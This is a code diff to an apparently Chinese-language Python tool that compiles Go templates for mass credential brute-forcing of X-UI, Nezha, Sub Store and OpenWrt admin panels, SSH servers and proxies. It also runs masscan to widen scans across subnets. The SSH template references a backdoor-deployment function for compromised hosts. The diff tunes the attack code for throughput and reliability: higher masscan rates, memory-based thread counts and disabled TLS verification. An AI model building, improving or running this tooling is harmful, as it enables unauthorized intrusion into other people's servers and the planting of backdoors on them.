@@ -36,6 +36,7 @@ XUI_GO_TEMPLATE_1 = '''package main
 import (
 	"bufio"
 	"context"
+	"crypto/tls"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -106,11 +107,13 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 	ip := parts[0]
 	port := parts[1]
 
+	tr := &http.Transport{
+		DisableKeepAlives: true,
+		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
+	}
 	httpClient := &http.Client{
-		Transport: &http.Transport{
-			MaxIdleConnsPerHost: 10,
-		},
-		Timeout: 10 * time.Second,
+		Transport: tr,
+		Timeout:   10 * time.Second,
 	}
 
 	for _, username := range usernames {
@@ -130,6 +133,7 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 
 			// Try HTTPS if HTTP fails
 			if err != nil {
+				if resp != nil { resp.Body.Close() }
 				ctx2, cancel2 := context.WithTimeout(context.Background(), 10*time.Second)
 				checkUrlHttps := fmt.Sprintf("https://%s:%s/login", ip, port)
 				payloadHttps := fmt.Sprintf("username=%s&password=%s", username, password)
@@ -142,6 +146,7 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 			}
 
 			if err != nil {
+				if resp != nil { resp.Body.Close() }
 				continue
 			}
 			
@@ -162,6 +167,13 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 }
 
 func main() {
+	if len(os.Args) < 3 {
+		fmt.Println("Usage: ./program <inputFile> <outputFile>")
+		os.Exit(1)
+	}
+	inputFile := os.Args[1]
+	outputFile := os.Args[2]
+
 	go func() {
 		http.ListenAndServe("localhost:6060", nil)
 	}()
@@ -176,7 +188,6 @@ func main() {
 
 	go memoryMonitor()
 
-	inputFile := "results.txt"
 	batch, err := os.Open(inputFile)
 	if err != nil {
 		fmt.Printf("无法读取输入文件: %v\\n", err)
@@ -192,19 +203,19 @@ func main() {
         return
     }
 
-	outputFile, err := os.OpenFile("xui.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
 		fmt.Println("无法打开输出文件:", err)
 		return
 	}
-	defer outputFile.Close()
+	defer outFile.Close()
 	
 	tasks := make(chan string, {semaphore_size})
 	var wg sync.WaitGroup
 
 	for i := 0; i < {semaphore_size}; i++ {
 		wg.Add(1)
-		go worker(tasks, outputFile, &wg, usernames, passwords)
+		go worker(tasks, outFile, &wg, usernames, passwords)
 	}
 
 	scanner := bufio.NewScanner(batch)
@@ -220,7 +231,6 @@ func main() {
 
 	close(tasks)
 	wg.Wait()
-	fmt.Println("\\n全部处理完成！")
 }
 '''
 # =========================== xui.go模板2内容 (哪吒面板) ===========================
@@ -229,6 +239,7 @@ XUI_GO_TEMPLATE_2 = '''package main
 import (
 	"bufio"
 	"context"
+	"crypto/tls"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -292,9 +303,13 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 	ip := parts[0]
 	port := parts[1]
 
+	tr := &http.Transport{
+		DisableKeepAlives: true,
+		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
+	}
 	httpClient := &http.Client{
-		Transport: &http.Transport{ MaxIdleConnsPerHost: 10 },
-		Timeout: 10 * time.Second,
+		Transport: tr,
+		Timeout:   10 * time.Second,
 	}
 
 	for _, username := range usernames {
@@ -313,6 +328,7 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 			cancel()
 
 			if err != nil {
+				if resp != nil { resp.Body.Close() }
 				ctx2, cancel2 := context.WithTimeout(context.Background(), 10*time.Second)
 				checkUrlHttps := fmt.Sprintf("https://%s:%s/api/v1/login", ip, port)
 				reqHttps, err := http.NewRequestWithContext(ctx2, "POST", checkUrlHttps, strings.NewReader(string(jsonPayload)))
@@ -324,6 +340,7 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 			}
 
 			if err != nil {
+				if resp != nil { resp.Body.Close() }
 				continue
 			}
 			
@@ -344,6 +361,13 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 }
 
 func main() {
+	if len(os.Args) < 3 {
+		fmt.Println("Usage: ./program <inputFile> <outputFile>")
+		os.Exit(1)
+	}
+	inputFile := os.Args[1]
+	outputFile := os.Args[2]
+
 	go func() {
 		http.ListenAndServe("localhost:6060", nil)
 	}()
@@ -358,12 +382,12 @@ func main() {
     
     go memoryMonitor()
 
-	inputFile, err := os.Open("results.txt")
+	batch, err := os.Open(inputFile)
 	if err != nil {
 		fmt.Printf("无法读取输入文件: %v\\n", err)
 		return
 	}
-	defer inputFile.Close()
+	defer batch.Close()
 
 	usernames := {user_list}
 	passwords := {pass_list}
@@ -373,22 +397,22 @@ func main() {
         return
     }
 
-	outputFile, err := os.OpenFile("xui.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
 		fmt.Println("无法打开输出文件:", err)
 		return
 	}
-	defer outputFile.Close()
+	defer outFile.Close()
 
 	tasks := make(chan string, {semaphore_size})
 	var wg sync.WaitGroup
 
 	for i := 0; i < {semaphore_size}; i++ {
 		wg.Add(1)
-		go worker(tasks, outputFile, &wg, usernames, passwords)
+		go worker(tasks, outFile, &wg, usernames, passwords)
 	}
 
-	scanner := bufio.NewScanner(inputFile)
+	scanner := bufio.NewScanner(batch)
 	for scanner.Scan() {
         for atomic.LoadInt32(&isMemoryThrottled) == 1 {
             time.Sleep(250 * time.Millisecond)
@@ -401,7 +425,6 @@ func main() {
 
 	close(tasks)
 	wg.Wait()
-	fmt.Println("\\n全部处理完成！")
 }
 '''
 # =========================== xui.go模板6内容 (SSH) ===========================
@@ -525,34 +548,41 @@ func deployBackdoor(client *ssh.Client, ip, port, username, password string, cmd
 // ... (helper functions for backdoor deployment like checkUnzip, installPackage, etc. remain the same)
 
 func main() {
+	if len(os.Args) < 3 {
+		fmt.Println("Usage: ./program <inputFile> <outputFile>")
+		os.Exit(1)
+	}
+	inputFile := os.Args[1]
+	outputFile := os.Args[2]
+
     go memoryMonitor()
 
-	inputFile, err := os.Open("results.txt")
+	batch, err := os.Open(inputFile)
 	if err != nil {
 		fmt.Printf("无法读取输入文件: %v\\n", err)
 		return
 	}
-	defer inputFile.Close()
+	defer batch.Close()
 
 	usernames := {user_list}
 	passwords := {pass_list}
 
-	outputFile, err := os.OpenFile("xui.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
 		fmt.Println("无法打开输出文件:", err)
 		return
 	}
-	defer outputFile.Close()
+	defer outFile.Close()
 
 	tasks := make(chan string, {semaphore_size})
 	var wg sync.WaitGroup
 
 	for i := 0; i < {semaphore_size}; i++ {
 		wg.Add(1)
-		go worker(tasks, outputFile, &wg, usernames, passwords)
+		go worker(tasks, outFile, &wg, usernames, passwords)
 	}
 
-	scanner := bufio.NewScanner(inputFile)
+	scanner := bufio.NewScanner(batch)
 	for scanner.Scan() {
         for atomic.LoadInt32(&isMemoryThrottled) == 1 {
             time.Sleep(250 * time.Millisecond)
@@ -565,7 +595,6 @@ func main() {
 
 	close(tasks)
 	wg.Wait()
-	fmt.Println("\\n全部处理完成！")
 }
 '''
 # =========================== xui.go模板7内容 (Sub Store) ===========================
@@ -574,6 +603,7 @@ XUI_GO_TEMPLATE_7 = '''package main
 import (
 	"bufio"
 	"context"
+	"crypto/tls"
 	"fmt"
 	"io"
 	"net/http"
@@ -612,8 +642,12 @@ func memoryMonitor() {
 
 func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, paths []string) {
 	defer wg.Done()
+	tr := &http.Transport{
+		DisableKeepAlives: true,
+		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
+	}
 	client := &http.Client{
-		Transport: &http.Transport{ MaxIdleConnsPerHost: 10 },
+		Transport: tr,
 		Timeout:   10 * time.Second,
 	}
 	for line := range tasks {
@@ -660,9 +694,11 @@ func sendRequest(client *http.Client, fullURL string) (bool, error) {
 	if err != nil {
 		return false, err
 	}
-	// ... (headers)
 	resp, err := client.Do(req)
-	if err != nil { return false, err }
+	if err != nil { 
+        if resp != nil { resp.Body.Close() }
+        return false, err 
+    }
 	defer resp.Body.Close()
 
 	if resp.StatusCode == http.StatusOK {
@@ -675,33 +711,40 @@ func sendRequest(client *http.Client, fullURL string) (bool, error) {
 }
 
 func main() {
+	if len(os.Args) < 3 {
+		fmt.Println("Usage: ./program <inputFile> <outputFile>")
+		os.Exit(1)
+	}
+	inputFile := os.Args[1]
+	outputFile := os.Args[2]
+
     go memoryMonitor()
 
-	inputFile, err := os.Open("results.txt")
+	batch, err := os.Open(inputFile)
 	if err != nil {
 		fmt.Printf("无法读取输入文件: %v\\n", err)
 		return
 	}
-	defer inputFile.Close()
+	defer batch.Close()
 
 	paths := {pass_list} // Using pass_list as paths
 
-	outputFile, err := os.OpenFile("xui.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
 		fmt.Println("无法打开输出文件:", err)
 		return
 	}
-	defer outputFile.Close()
+	defer outFile.Close()
 
 	tasks := make(chan string, {semaphore_size})
 	var wg sync.WaitGroup
 
 	for i := 0; i < {semaphore_size}; i++ {
 		wg.Add(1)
-		go worker(tasks, outputFile, &wg, paths)
+		go worker(tasks, outFile, &wg, paths)
 	}
 
-	scanner := bufio.NewScanner(inputFile)
+	scanner := bufio.NewScanner(batch)
 	for scanner.Scan() {
         for atomic.LoadInt32(&isMemoryThrottled) == 1 {
             time.Sleep(250 * time.Millisecond)
@@ -714,7 +757,6 @@ func main() {
 
 	close(tasks)
 	wg.Wait()
-	fmt.Println("\\n全部处理完成！")
 }
 '''
 # =========================== xui.go模板8内容 (OpenWrt) ===========================
@@ -723,6 +765,7 @@ XUI_GO_TEMPLATE_8 = '''package main
 import (
 	"bufio"
 	"context"
+	"crypto/tls"
 	"fmt"
 	"net/http"
 	"net/url"
@@ -759,7 +802,12 @@ func memoryMonitor() {
 
 func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []string, passwords []string) {
 	defer wg.Done()
+	tr := &http.Transport{
+		DisableKeepAlives: true,
+		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
+	}
 	client := &http.Client{
+		Transport: tr,
 		Timeout: 10 * time.Second,
 		CheckRedirect: func(req *http.Request, via []*http.Request) error {
 			return http.ErrUseLastResponse
@@ -807,7 +855,10 @@ func checkLogin(urlStr, username, password, origin, referer string, client *http
 	// ... (set headers)
 	
 	resp, err := client.Do(req)
-	if err != nil { return false }
+	if err != nil { 
+        if resp != nil { resp.Body.Close() }
+        return false 
+    }
 	defer resp.Body.Close()
 
 	for _, c := range resp.Cookies() {
@@ -819,34 +870,41 @@ func checkLogin(urlStr, username, password, origin, referer string, client *http
 }
 
 func main() {
+	if len(os.Args) < 3 {
+		fmt.Println("Usage: ./program <inputFile> <outputFile>")
+		os.Exit(1)
+	}
+	inputFile := os.Args[1]
+	outputFile := os.Args[2]
+
     go memoryMonitor()
 
-	inputFile, err := os.Open("results.txt")
+	batch, err := os.Open(inputFile)
 	if err != nil {
 		fmt.Printf("无法读取输入文件: %v\\n", err)
 		return
 	}
-	defer inputFile.Close()
+	defer batch.Close()
 
 	usernames := {user_list}
 	passwords := {pass_list}
 
-	outputFile, err := os.OpenFile("xui.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
 		fmt.Println("无法打开输出文件:", err)
 		return
 	}
-	defer outputFile.Close()
+	defer outFile.Close()
 
 	tasks := make(chan string, {semaphore_size})
 	var wg sync.WaitGroup
 
 	for i := 0; i < {semaphore_size}; i++ {
 		wg.Add(1)
-		go worker(tasks, outputFile, &wg, usernames, passwords)
+		go worker(tasks, outFile, &wg, usernames, passwords)
 	}
 
-	scanner := bufio.NewScanner(inputFile)
+	scanner := bufio.NewScanner(batch)
 	for scanner.Scan() {
         for atomic.LoadInt32(&isMemoryThrottled) == 1 {
             time.Sleep(250 * time.Millisecond)
@@ -859,7 +917,6 @@ func main() {
 
 	close(tasks)
 	wg.Wait()
-	fmt.Println("\\n全部处理完成！")
 }
 '''
 # =========================== PROXY_GO_TEMPLATE (SOCKS5, HTTP, HTTPS代理) ===========================
@@ -988,7 +1045,10 @@ func getPublicIP(targetURL string) (string, error) {
 }
 
 func checkConnection(proxyAddr string, auth *proxy.Auth, timeout time.Duration) (bool, error) {
-	transport := &http.Transport{ MaxIdleConnsPerHost: 10 }
+	transport := &http.Transport{ 
+		DisableKeepAlives: true,
+		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
+	}
 
 	if proxyType == "http" || proxyType == "https" {
 		var proxyURLString string
@@ -1000,9 +1060,6 @@ func checkConnection(proxyAddr string, auth *proxy.Auth, timeout time.Duration) 
 		proxyURL, err := url.Parse(proxyURLString)
 		if err != nil { return false, err }
 		transport.Proxy = http.ProxyURL(proxyURL)
-		if proxyType == "https" {
-			transport.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
-		}
 	} else { // socks5
 		dialer, err := proxy.SOCKS5("tcp", proxyAddr, auth, &net.Dialer{
 			Timeout:   timeout,
@@ -1019,7 +1076,10 @@ func checkConnection(proxyAddr string, auth *proxy.Auth, timeout time.Duration) 
 	if err != nil { return false, err }
 	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36")
 	resp, err := httpClient.Do(req)
-	if err != nil { return false, err }
+	if err != nil { 
+        if resp != nil { resp.Body.Close() }
+        return false, err 
+    }
 	defer resp.Body.Close()
 
 	body, err := ioutil.ReadAll(resp.Body)
@@ -1040,6 +1100,13 @@ func checkConnection(proxyAddr string, auth *proxy.Auth, timeout time.Duration) 
 }
 
 func main() {
+	if len(os.Args) < 3 {
+		fmt.Println("Usage: ./program <inputFile> <outputFile>")
+		os.Exit(1)
+	}
+	inputFile := os.Args[1]
+	outputFile := os.Args[2]
+
     go memoryMonitor()
 
 	var err error
@@ -1048,26 +1115,26 @@ func main() {
 		realIP = "UNKNOWN"
 	}
 
-	proxies, err := os.Open("results.txt")
+	proxies, err := os.Open(inputFile)
 	if err != nil {
 		fmt.Printf("无法打开代理文件: %v\\n", err)
 		return
 	}
 	defer proxies.Close()
 
-	outputFile, err := os.OpenFile("xui.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
 		fmt.Printf("无法创建输出文件: %v\\n", err)
 		return
 	}
-	defer outputFile.Close()
+	defer outFile.Close()
 
 	tasks := make(chan string, {semaphore_size})
 	var wg sync.WaitGroup
 
 	for i := 0; i < {semaphore_size}; i++ {
 		wg.Add(1)
-		go worker(tasks, outputFile, &wg)
+		go worker(tasks, outFile, &wg)
 	}
 
 	scanner := bufio.NewScanner(proxies)
@@ -1214,31 +1281,38 @@ func isValidResponse(resp *http.Response) bool {
 }
 
 func main() {
+	if len(os.Args) < 3 {
+		fmt.Println("Usage: ./program <inputFile> <outputFile>")
+		os.Exit(1)
+	}
+	inputFile := os.Args[1]
+	outputFile := os.Args[2]
+
     go memoryMonitor()
 
-	inputFile, err := os.Open("results.txt")
+	batch, err := os.Open(inputFile)
 	if err != nil {
 		fmt.Printf("无法读取输入文件: %v\\n", err)
 		return
 	}
-	defer inputFile.Close()
+	defer batch.Close()
 
-	outputFile, err := os.OpenFile("xui.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
 		fmt.Println("无法打开输出文件:", err)
 		return
 	}
-	defer outputFile.Close()
+	defer outFile.Close()
 
 	tasks := make(chan string, {semaphore_size})
 	var wg sync.WaitGroup
 
 	for i := 0; i < {semaphore_size}; i++ {
 		wg.Add(1)
-		go worker(tasks, outputFile, &wg)
+		go worker(tasks, outFile, &wg)
 	}
 
-	scanner := bufio.NewScanner(inputFile)
+	scanner := bufio.NewScanner(batch)
 	for scanner.Scan() {
         for atomic.LoadInt32(&isMemoryThrottled) == 1 {
             time.Sleep(250 * time.Millisecond)
@@ -1254,7 +1328,6 @@ func main() {
 
 	close(tasks)
 	wg.Wait()
-	fmt.Println("\\n全部处理完成！")
 }
 '''
 
@@ -1548,8 +1621,6 @@ def compile_go_program():
         go_env['GOCACHE'] = '/tmp/.cache/go-build'
 
     try:
-        # ==================== PYTHON 3.6 COMPATIBILITY FIX ====================
-        # Replaced capture_output=True and text=True with pipes for Python 3.6 compatibility
         process = subprocess.Popen(
             [GO_EXEC, 'build', '-o', executable_name, 'xui.go'],
             stdout=subprocess.PIPE,
@@ -1562,7 +1633,6 @@ def compile_go_program():
 
         if process.returncode != 0:
             raise subprocess.CalledProcessError(process.returncode, [GO_EXEC, 'build', '-o', executable_name, 'xui.go'], stdout, stderr)
-        # ======================================================================
         
         if stderr:
             print("--- Go编译器警告 ---")
@@ -1668,7 +1738,7 @@ def print_progress_bar(iteration, total, start_time, prefix='', suffix='', lengt
     if iteration == total:
         sys.stdout.write('\n')
 
-def run_xui_for_parts(sleep_seconds, executable_name, total_ips):
+def run_xui_for_parts(sleep_seconds, executable_name, total_ips, semaphore_size):
     part_files = sorted([f for f in os.listdir(TEMP_PART_DIR) if f.startswith('part_') and f.endswith('.txt')])
     total_parts = len(part_files)
     start_time = time.time()
@@ -1682,7 +1752,6 @@ def run_xui_for_parts(sleep_seconds, executable_name, total_ips):
     run_env["GOMEMLIMIT"] = f"{mem_limit}MiB"
     run_env["GOGC"] = "50"
     print("--- 已设置Go垃圾回收器(GC)更积极地运行以控制内存。 ---")
-    print("--- Go程序将进行自我内存调节以防止崩溃。 ---")
 
     print_progress_bar(0, total_ips, start_time, prefix='爆破进度', suffix='开始...')
     for idx, part in enumerate(part_files, 1):
@@ -1696,7 +1765,6 @@ def run_xui_for_parts(sleep_seconds, executable_name, total_ips):
                 break
         
         part_path = os.path.join(TEMP_PART_DIR, part)
-        shutil.copy(part_path, 'results.txt')
         
         ips_in_part = 0
         with open(part_path, 'r', encoding='utf-8') as f:
@@ -1706,11 +1774,8 @@ def run_xui_for_parts(sleep_seconds, executable_name, total_ips):
             if sys.platform != "win32":
                 os.chmod(executable_name, 0o755)
             
-            cmd = []
-            if sys.platform == "linux":
-                cmd.extend(["nice", "-n", "10", "ionice", "-c", "2", "-n", "7"])
-            cmd.append('./' + executable_name)
-            cmd.append(str(mem_limit)) # Pass mem_limit as argument
+            output_file = os.path.join(TEMP_XUI_DIR, f'xui{idx}.txt')
+            cmd = ['./' + executable_name, part_path, output_file]
 
             process = subprocess.Popen(
                 cmd,
@@ -1733,15 +1798,6 @@ def run_xui_for_parts(sleep_seconds, executable_name, total_ips):
             print(f"\n--- 程序执行失败: {part} ---")
             print(f"返回码: {e.returncode}")
             sys.exit(1)
-
-        output_file = os.path.join(TEMP_XUI_DIR, f'xui{idx}.txt')
-        if os.path.exists('xui.txt'):
-            shutil.move('xui.txt', output_file)
-        
-        if os.path.exists("hmsuccess.txt"):
-            shutil.move("hmsuccess.txt", os.path.join(TEMP_HMSUCCESS_DIR, f"hmsuccess{idx}.txt"))
-        if os.path.exists("hmfail.txt"):
-            shutil.move("hmfail.txt", os.path.join(TEMP_HMFAIL_DIR, f"hmfail{idx}.txt"))
         
         processed_ips += ips_in_part
         if processed_ips > total_ips:
@@ -1786,7 +1842,7 @@ def clean_temp_files():
     shutil.rmtree(TEMP_HMSUCCESS_DIR, ignore_errors=True)
     shutil.rmtree(TEMP_HMFAIL_DIR, ignore_errors=True)
 
-    for f in ['results.txt', 'xui.go', 'ipcx.py', 'go.mod', 'go.sum', 'xui_executable', 'xui_executable.exe']: 
+    for f in ['xui.go', 'ipcx.py', 'go.mod', 'go.sum', 'xui_executable', 'xui_executable.exe']: 
         if os.path.exists(f):
             try:
                 os.remove(f)
@@ -2103,7 +2159,7 @@ def parse_result_line(line):
             
     return None, None, None, None
 
-def analyze_and_expand_scan(result_file, template_mode, params, template_map):
+def analyze_and_expand_scan(result_file, template_mode, params, template_map, masscan_rate):
     if not os.path.exists(result_file) or os.path.getsize(result_file) == 0:
         return set()
 
@@ -2147,7 +2203,7 @@ def analyze_and_expand_scan(result_file, template_mode, params, template_map):
                 print(f"    - Masscan 第 {k+1}/2 轮...")
                 try:
                     if os.path.exists(masscan_output_file): os.remove(masscan_output_file)
-                    masscan_cmd = ["masscan", subnet, "-p", port, "--rate=10000", "-oG", masscan_output_file]
+                    masscan_cmd = ["masscan", subnet, "-p", port, "--rate=" + str(masscan_rate), "-oG", masscan_output_file]
                     subprocess.run(masscan_cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
                     with open(masscan_output_file, 'r') as f:
@@ -2162,7 +2218,8 @@ def analyze_and_expand_scan(result_file, template_mode, params, template_map):
             if not ips_to_verify:
                 continue
 
-            with open('results.txt', 'w') as f:
+            verification_input_file = "verification_input.tmp"
+            with open(verification_input_file, 'w') as f:
                 for ip in ips_to_verify:
                     f.write(f"{ip}:{port}\n")
             
@@ -2178,23 +2235,27 @@ def analyze_and_expand_scan(result_file, template_mode, params, template_map):
 
             try:
                 run_env = os.environ.copy()
-                # ==================== FIX: PASS MEMORY LIMIT ARGUMENT ====================
                 total_memory = psutil.virtual_memory().total
                 mem_limit = int(total_memory * 0.70 / 1024 / 1024)
                 run_env["GOMEMLIMIT"] = f"{mem_limit}MiB"
                 run_env["GOGC"] = "50"
-                cmd = ['./' + executable_name, str(mem_limit)]
-                # =======================================================================
+                
+                verification_output_file = "verification_output.tmp"
+                if os.path.exists(verification_output_file): os.remove(verification_output_file)
+
+                cmd = ['./' + executable_name, verification_input_file, verification_output_file]
                 subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, env=run_env)
                 
-                if os.path.exists('xui.txt'):
-                    with open('xui.txt', 'r') as f:
+                if os.path.exists(verification_output_file):
+                    with open(verification_output_file, 'r') as f:
                         new_finds = {line.strip() for line in f}
                         print(f"    - 二次验证成功 {len(new_finds)} 个新目标。")
                         newly_verified_this_round.update(new_finds)
-                    os.remove('xui.txt')
+                    os.remove(verification_output_file)
             except Exception as e:
                 print(f"    - ❌ 二次验证失败: {e}")
+            
+            if os.path.exists(verification_input_file): os.remove(verification_input_file)
         
         new_ips_this_round = newly_verified_this_round - master_results
         if not new_ips_this_round:
@@ -2205,7 +2266,6 @@ def analyze_and_expand_scan(result_file, template_mode, params, template_map):
         ips_to_analyze = new_ips_this_round
 
     if os.path.exists(masscan_output_file): os.remove(masscan_output_file)
-    if os.path.exists("results.txt"): os.remove("results.txt")
 
     with open(result_file, 'r', encoding='utf-8') as f:
         initial_set = {line.strip() for line in f}
@@ -2293,8 +2353,17 @@ if __name__ == "__main__":
 
                 lines_per_file = input_with_default("每个小文件行数", 5000)
                 sleep_seconds = input_with_default("爆破完休息秒数", 2)
-                params['semaphore_size'] = input_with_default("爆破线程数", 250)
+                
+                # ==================== DYNAMIC THREAD COUNT ====================
+                total_memory_mb = psutil.virtual_memory().total / 1024 / 1024
+                # 假设每个线程平均消耗 2.5MB 内存，并保留30%的系统内存
+                recommended_threads = int((total_memory_mb * 0.7) / 2.5)
+                if recommended_threads < 50: recommended_threads = 50 # 设置一个最小值
+                params['semaphore_size'] = input_with_default(f"爆破线程数 (根据内存推荐 {recommended_threads})", recommended_threads)
+                # =============================================================
+
                 params['timeout'] = input_with_default("超时时间(秒)", 10)
+                masscan_rate = input_with_default("请输入Masscan扫描速率(pps)", 50000)
                 
                 params['usernames'], params['passwords'], params['credentials'] = load_credentials(TEMPLATE_MODE, AUTH_MODE)
                 params['auth_mode'] = AUTH_MODE
@@ -2318,13 +2387,13 @@ if __name__ == "__main__":
                 executable = compile_go_program()
                 generate_ipcx_py()
                 split_file(input_file, lines_per_file)
-                run_xui_for_parts(sleep_seconds, executable, total_ips)
+                run_xui_for_parts(sleep_seconds, executable, total_ips, params['semaphore_size'])
                 
                 merge_xui_files()
                 
                 initial_results_file = "xui.txt"
                 if os.path.exists(initial_results_file) and os.path.getsize(initial_results_file) > 0:
-                    newly_found_results = analyze_and_expand_scan(initial_results_file, TEMPLATE_MODE, params, template_map)
+                    newly_found_results = analyze_and_expand_scan(initial_results_file, TEMPLATE_MODE, params, template_map, masscan_rate)
                     if newly_found_results:
                         print(f"--- 扩展扫描完成，共新增 {len(newly_found_results)} 个结果。正在合并... ---")
                         with open(initial_results_file, 'a', encoding='utf-8') as f:
